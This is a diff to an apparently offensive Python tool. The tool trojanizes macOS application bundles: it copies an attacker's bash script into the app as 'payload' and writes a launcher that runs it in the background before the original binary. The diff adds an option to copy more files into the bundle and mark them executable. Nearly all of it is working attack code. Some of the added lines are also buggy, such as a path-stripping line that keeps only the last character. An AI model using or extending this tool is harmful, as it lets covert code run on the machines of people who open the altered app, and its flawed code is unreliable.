@@ -27,6 +27,7 @@ parser = argparse.ArgumentParser()
 parser.add_argument('-a', '--app', type=str, nargs=1, required=True, help='OSX target application')
 parser.add_argument('-i', '--inject', type=str, nargs=1, required=True, help='Bash script to inject')
 parser.add_argument('-o', '--output', type=str, nargs=1, required=True, help='Output for the new application')
+parser.add_argument('-in', '--include', type=str, nargs=1, required=False, help='Inject other files into application')
 
 def banner():
 	bannertxt = """ 
@@ -66,9 +67,22 @@ def get_app_name(app, output):
 
 banner()
 args = parser.parse_args()
-args.inject[0] = path.abspath(args.inject[0])
-args.app[0] = path.abspath(args.app[0])
-args.output[0] = path.abspath(args.output[0])
+includer = False
+try:
+	args.inject[0] = path.abspath(args.inject[0])
+	args.app[0] = path.abspath(args.app[0])
+	args.output[0] = path.abspath(args.output[0])
+	try:
+		if args.include[0] != "":
+			args.include[0] = path.abspath(args.include[0])
+			if args.include[0][-1:] == "/":
+				args.include[0] = args.include[0][-1:]
+			includer = True
+	except:
+		includer = False
+except:
+	print(C_BRed + "[!] Cannot get full path of files." + C_None)
+	quit()
 
 
 print("[i] Searching for application.")
@@ -126,12 +140,31 @@ if args.app[0][-1:] == "/":
 else:
 	appname = get_app_name(args.app[0], output)
 print("[+] Application name sucessfully analyzed: %s" % appname)
-print("[i] Change start order.")
 try:
 	os.chdir("MacOS/")
 except:
 	print(C_BRed + "[!] Cannot access applications main file." + C_None)
 	quit()
+if includer:
+	print("[i] Include files from folder...")
+	if path.isdir(args.include[0]):
+		print("[+] Get files: %s" % args.include[0])
+	else:
+		print(C_BRed + ("[!] Cannot find folder to include: %s" % args.include[0]) + C_None)
+		quit()
+	try:
+		subprocess.call(("cp -a '%s/.' ." % args.include[0]), shell=True)
+	except:
+		print(C_BRed + "[!] Cannot include other files." + C_None)
+		quit()
+if includer:
+	print("[i] Make included files executable...")
+	try:
+		subprocess.call(("chmod +x ."), shell=True)
+	except:
+		print(C_BRed + "[!] Cannot make other files executable." + C_None)
+		quit()
+print("[i] Change start order.")
 try:
 	subprocess.call(("cp '%s' payload" % args.inject[0]), shell=True)
 except:
@@ -143,7 +176,7 @@ except:
 	print(C_BRed + "[!] Cannot rearrange start order." + C_None)
 	quit()
 try:
-	subprocess.call(('echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; $DIR/payload & $DIR/injectra\' > "%s"' % appname), shell=True)
+	subprocess.call(('echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR ; $DIR/payload & $DIR/injectra\' > "%s"' % appname), shell=True)
 except:
 	print(C_BRed + "[!] Cannot write new start order." + C_None)
 	quit()
